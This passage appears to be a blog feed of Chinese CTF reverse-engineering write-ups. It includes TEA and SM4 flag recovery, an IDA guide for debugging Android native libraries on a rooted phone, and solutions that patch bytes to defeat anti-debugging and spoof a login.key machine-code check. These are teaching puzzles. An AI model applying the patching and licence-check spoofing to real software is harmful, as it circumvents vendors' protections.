alt="image-20211129135058075"></p><p>继续F9，发现即没有到达加减乘除那个块，也没有到达TEA算法那里就显示NO了，我么输入flag为 123456789012345678901234</p><p><img src="./image-20211129135555940.png" alt="image-20211129135555940"></p><p>好，程序断在了加减乘除那个块那里，直接一点点单步调试</p><p><img src="./image-20211129140054267.png" alt="image-20211129140054267"></p><p>在mul之前停下，观察寄存器，发现X1指向的是最后8个字符，然后来到X16寄存器指向的内存位置，稍微整理整理</p><p><img src="./image-20211129140156055.png" alt="image-20211129140156055"></p><p>发现系统初始化了16个字符  <code>PRST0123789: &quot;#$</code> ，然后下面紧跟着flag 的前16位，猜测flag是分开验证的16 + 8</p><p>跳过乘法，再看内存</p><p><img src="./image-20211129140515888.png" alt="image-20211129140515888"></p><p>最终调试到memcpy的位置</p><p><img src="./image-20211129140714060.png" alt="image-20211129140714060"></p><p><code>dword_7CD3B3E14C</code> 处的数据为</p><p><img src="./image-20211129140754349.png" alt="image-20211129140754349"></p><p>而刚才<code>0007FD020C630</code>处的数据已经变为了</p><p><img src="./image-20211129141049519.png" alt="image-20211129141049519"></p><p>于是猜测是flag的前16位根据<code>PRST0123789: &quot;#$</code> 加减乘除后 与<code>dword_7CD3B3E14C</code>进行对比，然后flag 的后8位是那个tea算法</p><p>这里一点点调试，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;] * [&#x27; &#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;] + [&#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;] = [1687, 1824, 1912, 2002]</span><br><span class="line">[&#x27;9&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;] * [&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;] + [&#x27;P&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;] = [2816, 2434, 2533, 2634]</span><br><span class="line">[&#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;] * [&#x27; &#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;] + [&#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;] = [1751, 1892, 1982, 2074]</span><br><span class="line">[&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;] * [&#x27; &#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;] + [&#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;] = [1623, 1756, 1842, 1930]</span><br></pre></td></tr></table></figure><p>写脚本解密得到flag的前16个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">3287</span>, <span class="number">1688</span>, <span class="number">3452</span>, <span class="number">1786</span>,    </span><br><span class="line">     <span class="number">3255</span>, <span class="number">1994</span>, <span class="number">1947</span>, <span class="number">2002</span>,   </span><br><span class="line">     <span class="number">2384</span>, <span class="number">2777</span>, <span class="number">2783</span>, <span class="number">5286</span>,   </span><br><span class="line">     <span class="number">3319</span>, <span class="number">1824</span>, <span class="number">1842</span>, <span class="number">2038</span>]   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mul1 = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;0123&quot;</span>]</span><br><span class="line"></span><br><span class="line">mul2 = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27; &quot;#$&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add1 = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;PRST&quot;</span>]</span><br><span class="line"></span><br><span class="line">add2 = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;789:&quot;</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line">flag1 = [(a[:<span class="number">4</span>][i]-add2[i])/mul2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">flag2 = [(a[<span class="number">4</span>:<span class="number">8</span>][i]-add2[i])/mul2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">flag3 = [(a[<span class="number">8</span>:<span class="number">12</span>][i]-add1[i])/mul1[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">flag4 = [(a[<span class="number">12</span>:][i]-add2[i])/mul2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"><span class="built_in">print</span>(flag3)</span><br><span class="line"><span class="built_in">print</span>(flag4)</span><br><span class="line"></span><br><span class="line">flag = flag1 + flag2 + flag3 + flag4</span><br><span class="line">flag = [<span class="built_in">chr</span>(<span class="built_in">int</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line"><span class="comment"># [101.0, 48.0, 97.0, 48.0]</span></span><br><span class="line"><span class="comment"># [100.0, 57.0, 54.0, 54.0]</span></span><br><span class="line"><span class="comment"># [48.0, 55.0, 54.0, 102.0]</span></span><br><span class="line"><span class="comment"># [102.0, 52.0, 51.0, 55.0]</span></span><br><span class="line"><span class="comment"># e0a0d966076ff437</span></span><br></pre></td></tr></table></figure><p>然后flag输入<code>e0a0d966076ff437ABCD1234</code>重新调试，果然程序断在了TEA算法的位置</p><p><img src="./image-20211129142112345.png" alt="image-20211129142112345"></p><p><img src="./image-20211129142119304.png" alt="image-20211129142119304"></p><p>发现果然是对flag的后8个字符进行TEA加密，直接运行到加密完成</p><p><img src="./image-20211129142238913.png" alt="image-20211129142238913"></p><p>然后进入汇编界面单步调试，注意CMP指令</p><p><img src="./image-20211129142317313.png" alt="image-20211129142317313"></p><p>可以发现V0加密后应改为<code>0XC65AEDA</code>,  这里修改X13的值为<code>0XC65AEDA</code>,使其验证通过，然后再单步</p><p><img src="./image-20211129142540130.png" alt="image-20211129142540130"></p><p>运行到这个位置，发现V1加密后的数据为 <code>0xADBF8DB1</code></p><p>直接写脚本解密</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//加密函数  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, i;         </span><br><span class="line"><span class="keyword">uint32_t</span> delta = <span class="number">0x12345678</span>;                   </span><br><span class="line"><span class="keyword">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];  </span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                     </span><br><span class="line">sum += delta;</span><br><span class="line">v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">&#125;                                             </span><br><span class="line">v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密函数  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> delta = <span class="number">0x12345678</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = delta * <span class="number">32</span>, i; </span><br><span class="line"><span class="keyword">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];  </span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                        </span><br><span class="line">v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">sum -= delta;</span><br><span class="line">&#125;                                          </span><br><span class="line">v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> byte_key[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x71</span>, <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>,</span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x61</span>, <span class="number">0x6D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//char enc[] = &#123; &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27; &#125;;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//uint32_t* v = (uint32_t*)enc;</span></span><br><span class="line"><span class="keyword">uint32_t</span> v[<span class="number">2</span>] = &#123; <span class="number">0x000000000C65AEDA</span> , <span class="number">0x00000000ADBF8DB1</span> &#125;;</span><br><span class="line"><span class="keyword">uint32_t</span>* k = (<span class="keyword">uint32_t</span>*)byte_key;</span><br><span class="line"><span class="built_in">decrypt</span>(v, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="./image-20211128222743505.png" alt="image-20211128222743505"></p><p>后8位是 <code>58af2715</code></p><p>拼凑得到 flag <code>e0a0d966076ff43758af2715</code></p><p><img src="./1.png" alt="1"></p><p>验证成功</p><hr><p>纪念AK RE, 拿了3一血，美滋滋</p><p><img src="./image-20211129143017613.png" alt="image-20211129143017613"></p><p><img src="./zuizhongpaiming.jpg" alt="zuizhongpaiming"></p><p>继续加油~~</p><h1 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h1><p>链接：<a href="https://pan.baidu.com/s/1FaBD6_FDjKLziKpVqvGe-Q">https://pan.baidu.com/s/1FaBD6_FDjKLziKpVqvGe-Q</a><br>提取码：ptjq </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
            <tag> ollvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA真机调试安卓so文件</title>
      <link href="/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/"/>
      <url>/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA真机调试安卓so文件"><a href="#IDA真机调试安卓so文件" class="headerlink" title="IDA真机调试安卓so文件"></a>IDA真机调试安卓so文件</h1><h2 id="简要"><a href="#简要" class="headerlink" title="简要"></a>简要</h2><p>看了网上很多的IDA真机调试安卓的文章，感觉很多步骤没有必要，这里整理一下最简单的实现安卓真机调试的步骤，以便以后参考，以 2021NCTF <code>easy_mobile</code>题目举例</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>首先需要一个root 后的手机，用数据线连接电脑，并且开启USB调试</li><li>电脑安装好 <code>adb</code></li><li>运行<code>adb devices</code> 观察设备是否已经连接</li></ol><p><img src="./image-20211129113618087.png" alt="image-20211129113618087"></p><ol start="4"><li><p>来到IDA安装目录的文件夹，将 用<code>adb push 电脑源目录 安卓的目的目录</code> 将 <code>dbgsrv</code>对应的文件放到手机文件的某个目录下</p><p><img src="./image-20211129114055704.png" alt="image-20211129114055704"></p></li><li><p>运行<code>adb shell</code> 然后<code>su</code> 切换到<code>root</code>权限，来到对应的目录下</p><p><img src="./image-20211129114216868.png" alt="image-20211129114216868"></p></li><li><p>给 <code>android_server</code> 和 <code>android_server64</code>加可执行权限</p><p><img src="./image-20211129114512249.png" alt="image-20211129114512249"></p></li><li><p>观察此题check_flag函数在<code>libnative-lib.so</code>文件中，为arm64架构</p></li></ol><p><img src="./image-20211129114849836.png" alt="image-20211129114849836"></p><ol start="8"><li><p>运行对应的server, 这里运行的是<code>./android_server64</code></p><p><img src="./image-20211129123450541.png" alt="image-20211129123450541"></p></li><li><p>端口转发<code>adb forward tcp:23946 tcp:23946</code></p></li></ol><p><img src="./image-20211129124505788.png" alt="image-20211129124505788"></p><ol start="10"><li>打开IDA，拖入对应的so文件，选择<code>Remote ARM Linux/Android debugger</code></li></ol><p><img src="./image-20211129124845996.png" alt="image-20211129124845996"></p><p>11、Debugger -&gt; Process options,填写localhost，端口保持默认</p><p><img src="./image-20211129124956427.png" alt="image-20211129124956427"></p><p>12、对应的手机上安装对应的APK文件</p><p><img src="./image-20211129125133781.png" alt="image-20211129125133781"></p><p>13、IDA Debugger -&gt; Attach to process, 选择对应的进程</p><p><img src="./image-20211129125415324.png" alt="image-20211129125415324"></p><p><img src="./image-20211129125534279.png" alt="image-20211129125534279"></p><p>14、在<code>Java_com_example_rectf_MainActivity_checkflag</code> 函数那里下断点，手机输入flag，点验证，IDA断下</p><p><img src="./image-20211129125834195.png" alt="image-20211129125834195"></p><blockquote><p>关于这个题的详细题解可以参考 <a href="https://zzzzsky.com/2021/11/29/NCTF2021_RE_WP/">https://zzzzsky.com/2021/11/29/NCTF2021_RE_WP/</a></p></blockquote><hr><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/xuan52rock/p/11010304.html">https://www.cnblogs.com/xuan52rock/p/11010304.html</a> </p><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/106298559">https://blog.csdn.net/Breeze_CAT/article/details/106298559</a></p><p><a href="https://www.i4k.xyz/article/haodawei123/104060906">https://www.i4k.xyz/article/haodawei123/104060906</a></p>]]></content>
      
      
      <categories>
          
          <category> 安卓 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 真机调试 </tag>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021GFCTF部分RE_WP</title>
      <link href="/2021/11/25/2021GFCTF_WP/"/>
      <url>/2021/11/25/2021GFCTF_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="2021GFCTF-RE-WP"><a href="#2021GFCTF-RE-WP" class="headerlink" title="2021GFCTF  RE_WP"></a>2021GFCTF  RE_WP</h1><h2 id="wordy"><a href="#wordy" class="headerlink" title="wordy"></a>wordy</h2><p>去除花指令</p><p><img src="./image-20211125095945784.png" alt="image-20211125095945784"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addr =<span class="number">0X556AE377FD56</span></span><br><span class="line">end = <span class="number">0x0556AE377FE40</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(addr, end, <span class="number">13</span>):</span><br><span class="line">    c = get_bytes(i+<span class="number">4</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    flag+=<span class="built_in">chr</span>(c)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># GFCTF&#123;u_are2wordy&#125;</span></span><br></pre></td></tr></table></figure><h2 id="BabyReverse"><a href="#BabyReverse" class="headerlink" title="BabyReverse"></a>BabyReverse</h2><p>IDA打开，去除所有的花指令</p><p><img src="./image-20211125100636917.png" alt="image-20211125100636917"></p><p>直接看下面对flag如何加密的，进入<code>sub_412E10</code>, 发现是SM4加密</p><p><img src="./image-20211125100743339.png" alt="image-20211125100743339"></p><p>而传入的第二个参数是key，即<code>byte_4409c0</code>是key，回到main函数再往上看，发现前面有一个对<code>byte_4409c0</code>类似RC4加密的操作,</p><p>对 <code>byte_4409C0</code>进行交叉引用</p><p><img src="./image-20211125100949459.png" alt="image-20211125100949459"></p><p><img src="./image-20211125101052255.png" alt="image-20211125101052255"></p><p>于是下断点调试来获取key，发现不行，猜测前面是反调试，从main函数头部下断点调试</p><p><img src="./image-20211125101538394.png" alt="image-20211125101538394"></p><p>最终定位到这个函数</p><p><img src="./image-20211125101557018.png" alt="image-20211125101557018"></p><p>采用的是self_mapping技术实现反调试，本质是创建secion的时候设置SEC_NO_CHANGE，映射后不能改变</p><p><a href="https://github.com/changeofpace/Self-Remapping-Code">Self-Remapping-Code</a></p><blockquote><p>关于这个技术，可以参考下这位大佬的笔记 <a href="https://jev0n.com/2021/09/23/Self-Remapping.html">https://jev0n.com/2021/09/23/Self-Remapping.html</a></p></blockquote><p>我们直接将<code>call sub_411CE0</code> 的地方nop掉，手动的把<code>byte_4409c0</code>的地方加1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [  <span class="number">0x07</span>, <span class="number">0xB8</span>, <span class="number">0x0D</span>, <span class="number">0x24</span>, <span class="number">0xB1</span>, <span class="number">0x0C</span>, <span class="number">0x2D</span>, <span class="number">0xC7</span>, <span class="number">0x28</span>, <span class="number">0x2D</span>, </span><br><span class="line">  <span class="number">0xC3</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x4F</span>, <span class="number">0x72</span>, <span class="number">0x13</span>]</span><br><span class="line">  </span><br><span class="line">addr = <span class="number">0x04409C0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    patch_byte(addr+i, a[i]+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行起来</p><p><img src="./image-20211125102324766.png" alt="image-20211125102324766"></p><p>得到key为 <code>GF?-&gt;GirlFriend?</code></p><p>提取密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0D 40 3B 87 A5 66 DA 74 92 7F BB E1 B8 CD EB BC 59 45 1B C0 38 99 AA 22 AA 3F 9D 21 07 4E 81 1F</span><br></pre></td></tr></table></figure><p><a href="https://the-x.cn/cryptography/Sm4.aspx">SM4在线解密</a></p><p><img src="./image-20211125102923390.png" alt="image-20211125102923390"></p><p><code>2e69df5961f20aee0897cf1905156344    </code>, 最终得到flag为 <code>GFCTF&#123;2e69df5961f20aee0897cf1905156344&#125;</code></p><h2 id="re-EasyRE-0x00"><a href="#re-EasyRE-0x00" class="headerlink" title="re_EasyRE_0x00"></a>re_EasyRE_0x00</h2><p>IDA打开分析，最关键的是<code>sub_100016A0</code>函数</p><p><img src="./image-20211125151517064.png" alt="image-20211125151517064"></p><p><img src="./image-20211125151806585.png" alt="image-20211125151806585"></p><p>经过分析，发现<code>sub_10001180</code>是解密login.key文件，生成的数据放到V13里面</p><p>然后下面这个地方是将V13处的数据与生成的一些数据进行对比，猜测是机器码的验证</p><p><img src="./image-20211125151922458.png" alt="image-20211125151922458"></p><p>这是V13处的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11 55 66 55 0D 50 51 0C FF 01 80 12 CE A9 08 75 73 65 72 32 33 33 33</span><br></pre></td></tr></table></figure><p>最后8个字符是user2333</p><p>将对比的数据也提取出来, 然后结合题目，用户名用admin6677登录，长度是9，整理得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11 55 66 55 98 FA 9B 59 6F F6 14 8F E9 DA 09 61 64 6D 69 6E 36 36 37 37</span><br></pre></td></tr></table></figure><p>我们写脚本，每次运行到对比数据的时候就把v13的数据给他替换掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x11</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x98</span>, <span class="number">0xFA</span>, <span class="number">0x9B</span>, <span class="number">0x59</span>, <span class="number">0x6F</span>, <span class="number">0xF6</span>, <span class="number">0x14</span>, <span class="number">0x8F</span>, <span class="number">0xE9</span>, <span class="number">0xDA</span>, <span class="number">0x09</span>, <span class="number">0x61</span>, <span class="number">0x64</span>, <span class="number">0x6D</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x37</span>]</span><br><span class="line">addr = <span class="number">0x004CB348</span>  <span class="comment"># v13的地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    patch_byte(addr+i, data[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后绕过机器码验证，往下走，来到<code>sub_10001610</code>处</p><p><img src="./image-20211125152844760.png" alt="image-20211125152844760"></p><p>可以发现，这个地方肯定是与服务器通信了，我们直接运行，直接Wireshark抓包</p><p>提取数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---&gt; <span class="number">11</span> <span class="number">55</span> <span class="number">66</span> <span class="number">55</span> <span class="number">1</span>a <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">    </span><br><span class="line">&lt;--- <span class="number">11</span> <span class="number">55</span> <span class="number">66</span> <span class="number">55</span> <span class="number">66</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0f</span> <span class="number">00</span> f3 <span class="number">46</span> <span class="number">8</span>a be <span class="number">81</span> <span class="number">62</span> ed <span class="number">36</span> d5 df <span class="number">28</span> dc <span class="number">04</span> <span class="number">8</span>a fd</span><br><span class="line">    </span><br><span class="line">---&gt; <span class="number">11</span> <span class="number">55</span> <span class="number">66</span> <span class="number">55</span> <span class="number">1</span>a <span class="number">27</span> <span class="number">01</span> <span class="number">00</span> <span class="number">40</span> <span class="number">00</span> <span class="number">0</span>e a2 <span class="number">60</span> <span class="number">19</span> <span class="number">1f</span> df <span class="number">39</span> <span class="number">0</span>d bc <span class="number">62</span> <span class="number">48</span> <span class="number">57</span> <span class="number">5</span>a <span class="number">11</span> <span class="number">87</span> <span class="number">78</span> <span class="number">69</span> <span class="number">11</span> <span class="number">03</span> <span class="number">76</span> <span class="number">4b</span> f9 <span class="number">2</span>c <span class="number">1f</span> <span class="number">35</span> fd ff <span class="number">4</span>a b8 d8 <span class="number">63</span> <span class="number">8f</span> b6 b1 f0 cd d3 <span class="number">90</span> <span class="number">2</span>d <span class="number">27</span> <span class="number">05</span> b7 <span class="number">1</span>e <span class="number">01</span> <span class="number">22</span> <span class="number">74</span> <span class="number">91</span> <span class="number">1</span>a a4 <span class="number">53</span> df <span class="number">1</span>d f4 <span class="number">69</span> <span class="number">7</span>d <span class="number">3</span>e <span class="number">29</span> bd d3 <span class="number">30</span> da <span class="number">94</span> a3 <span class="number">03</span></span><br><span class="line">    </span><br><span class="line">&lt;--- <span class="number">11</span> <span class="number">55</span> <span class="number">66</span> <span class="number">55</span> <span class="number">66</span> <span class="number">27</span> <span class="number">01</span> <span class="number">00</span> <span class="number">48</span> <span class="number">00</span> <span class="number">84</span> cb <span class="number">11</span> ef <span class="number">71</span> <span class="number">51</span> <span class="number">30</span> <span class="number">0b</span> b3 d8 c1 <span class="number">22</span> ac c4 ca f1 <span class="number">29</span> <span class="number">12</span> cf <span class="number">79</span> f5 <span class="number">36</span> <span class="number">5f</span> <span class="number">5</span>a <span class="number">5</span>e a8 f5 fa <span class="number">62</span> <span class="number">3</span>c e8 <span class="number">32</span> <span class="number">69</span> d6 a1 <span class="number">54</span> eb <span class="number">1b</span> <span class="number">06</span> <span class="number">06</span> b0 <span class="number">68</span> <span class="number">20</span> <span class="number">5</span>a <span class="number">62</span> ea <span class="number">48</span> ec <span class="number">8</span>a <span class="number">3</span>d <span class="number">5</span>c <span class="number">40</span> d0 a8 <span class="number">03</span> <span class="number">94</span> <span class="number">6</span>a <span class="number">2</span>e b7 f0 e4 <span class="number">33</span> aa a0 e3 f2 da f8 a9 cf <span class="number">5</span>d <span class="number">92</span> </span><br></pre></td></tr></table></figure><p>重新调试，接着刚才的位置往下分析，看到了RC4的初始化及加密</p><p><img src="./image-20211125155302278.png" alt="image-20211125155302278"></p><p><img src="./image-20211125155318573.png" alt="image-20211125155318573"></p><p>猜测是刚开始，服务器端返回RC4的key，然后后面全部使用RC4加密方式进行加密</p><p><img src="./image-20211125155723782.png" alt="image-20211125155723782"></p><p>根据<code>sub_10001350</code>这个函数可以猜测出数据包的格式, 拿上面服务器返回的key举例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11</span> <span class="number">55</span> <span class="number">66</span> <span class="number">55</span> <span class="comment">//标志</span></span><br><span class="line"><span class="number">66</span> <span class="number">27</span>       <span 